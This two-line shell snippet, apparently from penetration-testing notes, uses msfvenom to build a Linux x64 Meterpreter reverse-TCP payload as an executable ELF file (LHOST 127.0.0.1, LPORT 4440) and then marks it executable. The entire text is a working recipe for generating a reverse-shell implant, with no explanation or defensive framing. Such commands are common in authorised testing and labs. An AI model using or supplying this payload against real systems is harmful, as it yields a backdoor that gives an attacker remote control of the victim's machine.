msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4440  -f elf > shell-x64.elf
chmod +x shell-x64.elf
